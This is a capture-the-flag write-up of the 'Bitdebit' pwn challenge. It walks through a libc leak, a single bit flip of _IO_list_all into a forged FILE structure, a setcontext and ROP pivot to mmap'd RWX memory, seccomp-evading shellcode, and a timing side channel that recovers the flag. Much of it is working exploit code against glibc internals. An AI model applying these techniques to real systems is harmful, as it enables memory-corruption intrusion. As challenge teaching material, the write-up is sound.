# Bitdebit
First, thanks to `hiuhiu` and `kur0x1412`, who helped me solve this challenge 

## Static analysis
The challenge allows user to malloc `arbitrary size` and do `arbitrary read` inside that `allocated chunk`

It also print the chunk address value to the user, which gives us `heap leak` or `annon map leak` 
```c
puts("gib");
__isoc99_scanf("%lu", &size);
ptr = (char *)malloc(size);
__printf_chk(1, "%p\n", ptr);
fflush(stdout);
puts("gib");
__isoc99_scanf("%lu", &idx);
if ( idx >= size )
goto LABEL_8;
puts("Whats your name challenger?");
read(0, &ptr[idx], size - idx);
```
Then it allows us to `flip` only 1 bit at `arbitrary address`
## Exploit explanation
If I run the process with normal `ASLR on` and malloc with `0x100m size`, it will exceed the free size of heap and malloc a `annon chunk` instead of `normal heap chunk`

![alt text](image.png)

> The libc is consecutively right below the `allocated annon`, which enables us to leak libc
### Flip 1 bit
Our next target is flip bit to where helps us exploit, it will be `IO_list_all's value`
![alt text](image-1.png)

The target is flip the `fifth` byte of `stderr address` into the `allocated chunk`. 

In this process, the `stderr address` is `0x7f692fa044e0`. If we compare these 2, we will realize something:
```py
# stderr          : 0x7f 69 2f a04 4e0

# Allocated chunk : 0x7f 68 2f 7ff 010

                        # Fifth byte
# Allocated chunk : 0x7f 68 2f 7f f0 10
```
> This is the reason I allocated 0x100m chunk size, which is 0x10 00 00 00 00 00 00. 

I can calculate all bytes of `stderr` then simulate those exact same bytes at the first 4 lower significant bytes . Then at the `fifth` one, I just need to xor between `stderr` and `allocated chunk` to find out if it `<=7`. If satisfy, I'll continue the process and send that `exact bit` to `flip` the `fifth byte` back to my `controlled chunk`. 

From here, I had set up the fsop inside `allocated chunk` with the same byte in `4 lower bytes`, before choosing where and what bit to flip 
```py
io = FileStructure()
io.flags = 0x3b01010101010101
io._IO_write_base = 0
io._IO_write_ptr = libc.address
io.chain = libc.sym.stdout
io._wide_data = fake_file + 0x1c0 - 0xe0
io._lock = libc.sym._IO_stdfile_2_lock
io.vtable = libc.sym._IO_wfile_jumps

load = bytes(io).ljust(0x50, b'\0')
load += flat(b'\0' * 0xb8, fake_file + 0x1d0).ljust(0xe0, b'\0')
load += flat(fake_file + 0x1c8 - 0x68, thread_cleanup)

frame = bytearray(0xf8)
frame[0x20:0x28] = p64(setcontext)
frame[0x68:0x70] = p64(RWX)
frame[0x70:0x78] = p64(0x2000)
frame[0x88:0x90] = p64(7)
frame[0x98:0xa0] = p64(0x32)
frame[0xa0:0xa8] = p64(fake_file + 0x6a8)
frame[0xa8:0xb0] = p64(libc.sym.mmap)
load += frame
load = load.ljust(0x5b0, b'\0')

pop_rdi = 0x1157bc + libc.address
pop_rsi = 0x1261b1 + libc.address
pop_rcx = 0x00000000000a877e + libc.address
movsb = 0xba7ff + libc.address
shellcode = shell_gen(idx, mask)

load += frame
load += flat(
pop_rdi, RWX,
pop_rsi, fake_file + 0x6e8,
pop_rcx, len(shellcode),
movsb,
RWX,
)
load += shellcode
```
So after I successfully `flip` back to `fsop area`, my `arbitrary execution` will be  `__rpc_thread_key_cleanup + 46`

![alt text](image-2.png)
 
The reason is my `rdx` when executing `arb execution` contains 4 lower byte of the fake flag. 

The challenge allows only 2 `syscall`:
- 9: mmap (x86_64)
- 295: preadv (x86_64) - openat (i386)

My intend is to call `openat` in `i386` and `preadv` in `x86_64` because it doesn't check `architecture`. I'll first `set context` to execute `mmap` to allocate a `RWX` area. But the problem is `set_context` mainly uses `RDX` to set context
```c
pwndbg> x/10i setcontext+61
   0x7f5bebc4a99d <setcontext+61>:	mov    rsp,QWORD PTR [rdx+0xa0]
   0x7f5bebc4a9a4 <setcontext+68>:	mov    rbx,QWORD PTR [rdx+0x80]
   0x7f5bebc4a9ab <setcontext+75>:	mov    rbp,QWORD PTR [rdx+0x78]
   0x7f5bebc4a9af <setcontext+79>:	mov    r12,QWORD PTR [rdx+0x48]
   0x7f5bebc4a9b3 <setcontext+83>:	mov    r13,QWORD PTR [rdx+0x50]
   0x7f5bebc4a9b7 <setcontext+87>:	mov    r14,QWORD PTR [rdx+0x58]
   0x7f5bebc4a9bb <setcontext+91>:	mov    r15,QWORD PTR [rdx+0x60]
   0x7f5bebc4a9bf <setcontext+95>:	test   DWORD PTR fs:0x48,0x2
   0x7f5bebc4a9cb <setcontext+107>:	je     0x7f5bebc4aa86 <setcontext+294>
   0x7f5bebc4a9d1 <setcontext+113>:	mov    rsi,QWORD PTR [rdx+0x3a8]
```
Because of that, I need to call `__rpc_thread_key_cleanup + 46` in order to set up `RDX` through controlled `RAX`

After that, I'll call `mmap` then copy the shellcode to `RWX area` by:
```c
rep movsb byte ptr [rdi], byte ptr [rsi]
```
Because stack is controlled too so I'll just ret to that `shellcode` area
### Shellcode idea
The idea is read the flag into `a specified buffer`, because the challenge didn't give any way to print the flag properly so I need to brute and find out each byte of the flag, which requires me multiple times of reopening the process.
```c
def shell_gen(idx = 0, mask = 0):
    src = f'''
     /* Open the flag with i386 openat (syscall number 295). */
        mov  ebx, -100
        mov  ecx, {RWX + PATH}
        xor  edx, edx
        xor  esi, esi
        mov  eax, 295
        int  0x80

        /* Read the flag with x86_64 preadv (syscall number 295). */
        mov  edi, eax
        mov  esi, {RWX + IOV}
        mov  edx, 1
        xor  r10d, r10d
        xor  r8d, r8d
        mov  eax, 295
        syscall

        /* Baseline delay: confirms that the shellcode ran. */
        mov  rcx, {BASE}
        baseline_delay:
            dec  rcx
            jnz  baseline_delay

        /* A zero mask keeps the fast baseline; a set bit adds the delay. */
        movzx eax, byte ptr [{RWX+BUF+idx}]

        /*If not = 0 */
        test  al, {mask} 
        jz    no_extra_delay

        mov  rcx, {EXTRA}
    extra_delay:
        dec  rcx
        jnz  extra_delay

    no_extra_delay:
        ud2
    '''
    code_region = asm(src).ljust(PATH, b'\x90')
    path_region = FLAGPATH.ljust(IOV - PATH, b'\x00')
    iovec = p64(RWX + BUF) + p64(0x200)

    return code_region+path_region+iovec
```
To be simple, I'll check `each bit` at `a specific byte` by `test al, {mask}`If it is true, the process will be delayed by `decrease rcx` by 1 until `it = 0`, making the process live longer than expected
```asm
    test  al, {mask} 
    jz    no_extra_delay

    mov  rcx, {EXTRA} /*EXTRA = 0x100m */
extra_delay:
    dec  rcx
    jnz  extra_delay
```
Then my `script` will base on that `the live time of the process` to realize if the bit is true then update the flag bit at that byte index. I'll use `thread pool` to speed up the process because I have to guess bit `0-7` at each byte offset.

```python
with ThreadPoolExecutor(
    max_workers = 5,
    initializer=configure_worker,
) as executor:
    futures = []

    for task in bit_tasks:
        future = executor.submit(recover_one_bit, task)
        futures.append(future)

    for completed_future in as_completed(futures):
        result = completed_future.result()
        byte_index = result[0]
        bit_index = result[1]
        bit_is_set = result[2]

        if bit_is_set:
            bit_value = 1 << bit_index
            recovered_flag[byte_index] |= bit_value
```
But I'll need the medium time of flag guessing to have a base valid live time for a case that has correct bit. So I have to initialize 2 `variables`: 
- FAILURE_TIME
- VALID_TIME

```py
def get_time(n=2):
    def median_time(idx = 0, mask = 0):
        time_list = []
        for _ in range(n * 5):
            value = get_process_time(idx, mask)
            if value is not None:
                time_list.append(value)
            if len(time_list) == n:
                break
        if not time_list:
            raise RuntimeError('Unexpected errors in median_time')
      
        time_list.sort()
        return time_list[len(time_list) // 2]
    
    baseline_time = median_time(0, 0)        
    delayed_time = median_time(0, 0xff)       
    separation = delayed_time - baseline_time
    if separation >= max(0.1, baseline_time * 0.05):
        return baseline_time, delayed_time

    raise RuntimeError(f'Unexpected error in get_time')

def initialize_timing_thresholds():
    global FAILURE_TIME, VALID_TIME

    baseline_time, delayed_time = get_time()
    FAILURE_TIME = baseline_time * 0.45
    VALID_TIME = baseline_time + (delayed_time - baseline_time) * 0.40
    print(
        f'[*] basetime = {baseline_time:.3f}s delayed={delayed_time:.3f}s  '
        f'fail<{FAILURE_TIME:.3f}  Valid time ={VALID_TIME:.3f}'
    )
```
After that, I can enter the `guessing stage`. For each process with each bit at each byte, I'll check the process's time multiple times to ensure that the `right bit` is actually correct, not because of other `unexpected error` that made the process `live` longer.
```py
def oracle(idx =0 , mask = 0):
    set_bit_count = 0
    clear_bit_count = 0

    for i in range(20):
        bit_is_set = classify(get_process_time(idx, mask))
        if bit_is_set is None:
            continue
        # +1 if bit = 1
        set_bit_count += int(bit_is_set)
        # +1 if bit = 0
        clear_bit_count += int(not bit_is_set)

        if clear_bit_count >= 1 and set_bit_count == 0:
            return False
        if set_bit_count >= 2 and set_bit_count > clear_bit_count:
            return True
        if clear_bit_count >= 3 and clear_bit_count > set_bit_count:
            return False
    raise RuntimeError('Oracle failed')
```
After the strict check, I can ensure if the guess is right then return back the `TRUE / FALSE` value and `recover / skip` that bit:
```py
def recover_one_bit(task):
    byte_index, bit_index = task

    while True:
        try:
            bit_is_set = oracle(byte_index, 1 << bit_index)
            return byte_index, bit_index, bit_is_set
        except Exception as error:
            with output_lock:
                print(f'\n[!] ({byte_index},{bit_index}) {error}')
```
# Thanks to `HIUHIU` and `kur0x1412` help me solves this challenge in local

# Note
The script only success in local, `remote` in docker and server remains failed so this is just a `write up note`

Another note is the use of multithread:
```py
for byte_index in range(NBYTES):
        for bit_index in range(0, 8):
            task = (byte_index, bit_index)
            bit_tasks.append(task)

    with ThreadPoolExecutor(
        max_workers = 5,
        initializer=configure_worker,
    ) as executor:
        futures = []
```
- `max_workers`: the max thread can be executed, should not be too much because it can consume your memory and slow down CPU performance
- `initilizer`: The function that automatically execute first in every thread, it should be a set up / init function

The use of `multithread`:
```py
for task in bit_tasks:
        future = executor.submit(recover_one_bit, task)
        futures.append(future)

    for completed_future in as_completed(futures):
        result = completed_future.result()
        byte_index = result[0]
        bit_index = result[1]
        bit_is_set = result[2]
```
- `submit`: A function that add `target function` (recover_one_bit) into thread run queue with arg of function start from `arg2` (task). Then add that task into `futures` that contains the list of `queue processes`

- `as_completed(futures)`: It checks if any thread process inside the list `completed` then execute the block of code inside it

- `result`: get the result of the completed process and recover the bit of the flag `if TRUE`

